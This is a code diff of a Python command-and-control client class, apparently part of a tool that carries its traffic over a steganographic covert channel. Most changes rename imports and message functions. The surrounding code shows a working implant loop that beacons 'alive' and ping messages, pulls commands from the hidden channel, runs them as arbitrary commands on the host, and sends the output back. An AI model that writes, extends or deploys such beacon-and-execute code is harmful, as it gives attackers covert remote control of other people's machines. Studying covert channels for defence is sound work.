@@ -1,12 +1,11 @@
 import os.path
 import time
 
-from ccchanel import log as cclog
-from ccchanel.ccchanel_base import CCChanelBase
-from ccchanel.log import log_append as cclog_append
-from client import exec as cexec
-from client import payloads as cpayload
-from steno.steno_base import CCStenoBase
+from ccsuite.ccchanel import ccchanel_log as cclog
+from ccsuite.ccchanel.ccchanel_base import CCChanelBase
+from ccsuite.ccchanel import ccchanel_messages as cpayload
+from ccsuite.client import exec as cexec
+from ccsuite.steno.steno_base import CCStenoBase
 
 
 class CCClient(object):
@@ -25,7 +24,7 @@ class CCClient(object):
         cclog.log_init(self.ccchanel, self.own_log, self.steno_base)
 
     def tell_alive(self):
-        cclog.log_append(self.ccchanel, self.own_log, cpayload.alive_create(), self.steno_base)
+        cclog.log_append(self.ccchanel, self.own_log, cpayload.message_create_alive(), self.steno_base)
 
     def get_command(self):
         log = cclog.log_read(self.ccchanel, self.own_log, self.steno_base)
@@ -48,7 +47,7 @@ class CCClient(object):
             return cexec.execute_arbitrary_command(local_path, *args)
 
     def log_append(self, payload):
-        return cclog_append(self.ccchanel, self.own_log, payload, self.steno_base)
+        return cclog.log_append(self.ccchanel, self.own_log, payload, self.steno_base)
 
     def run(self):
         sleep_time = 15
@@ -61,7 +60,7 @@ class CCClient(object):
             if cmd is not None:
                 cmd_id = cmd['timestamp']
                 exec_out = self.execute_command(cmd['kind'], *cmd['args']).decode()
-                self.log_append(cpayload.done_create(cmd_id, exec_out))
+                self.log_append(cpayload.message_create_done(cmd_id, exec_out))
             print(f"SLEEP {sleep_time}")
             time.sleep(sleep_time)
-            self.log_append(cpayload.ping_create())
+            self.log_append(cpayload.message_create_ping())
